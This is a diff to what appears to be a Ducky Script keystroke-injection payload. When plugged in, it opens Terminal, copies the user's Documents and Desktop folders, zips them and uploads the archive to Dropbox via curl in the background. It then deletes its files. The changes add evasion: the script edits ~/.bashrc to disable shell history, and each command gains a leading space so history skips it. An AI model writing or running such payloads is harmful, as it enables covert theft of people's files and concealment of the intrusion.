@@ -18,45 +18,46 @@ STRING Terminal
 DELAY 1000
 ENTER
 DELAY 500
-STRING mkdir -p ~/Desktop/Backup/Desktop
+STRING echo -e "export HISTCONTROL=ignorespace\nunset HISTFILE" >> ~/.bashrc && source ~/.bashrc && exec bash
+DELAY 500
 ENTER
 DELAY 500
-STRING mkdir -p ~/Desktop/Backup/Documents
+STRING  mkdir -p ~/Desktop/Backup/Desktop
 ENTER
 DELAY 500
-STRING cp -R ~/Documents/* ~/Desktop/Backup/Documents/
+STRING  mkdir -p ~/Desktop/Backup/Documents
 ENTER
 DELAY 500
-STRING cp -R ~/Desktop/* ~/Desktop/Backup/Desktop/
+STRING  cp -R ~/Documents/* ~/Desktop/Backup/Documents/
 ENTER
 DELAY 500
-STRING echo 'cd ~/Desktop/Backup && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
+STRING  cp -R ~/Desktop/* ~/Desktop/Backup/Desktop/
+ENTER
+DELAY 500
+STRING  echo 'cd ~/Desktop/Backup && zip -r backup.zip . && curl -X POST https://content.dropboxapi.com/2/files/upload -H "Authorization: Bearer <API access token here>" -H "Dropbox-API-Arg: {\"path\": \"/Backup/backup.zip\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary @backup.zip' > upload.sh
 ENTER
 DELAY 2500
 ENTER
-STRING chmod +x upload.sh
+STRING  chmod +x upload.sh
 ENTER
 DELAY 500
-STRING nohup ./upload.sh >/dev/null 2>&1 &
+STRING  nohup ./upload.sh >/dev/null 2>&1 &
 ENTER
 DELAY 500
-STRING rm upload.sh
+STRING  rm upload.sh
 DELAY 500
 ENTER
 DELAY 5000
-STRING rm -r ~/Desktop/backup
+STRING  rm -r ~/Desktop/backup
 DELAY 500
 ENTER
 DELAY 5000 
-STRING rm backup.zip
+STRING  rm backup.zip
 DELAY 500
 ENTER
 DELAY 500
-STRING clear
+STRING  clear
 DELAY 500
-ENTER
-STRING rm ~/.bash_history
-DELAY 250
 ENTER
 DELAY 250
 GUI w
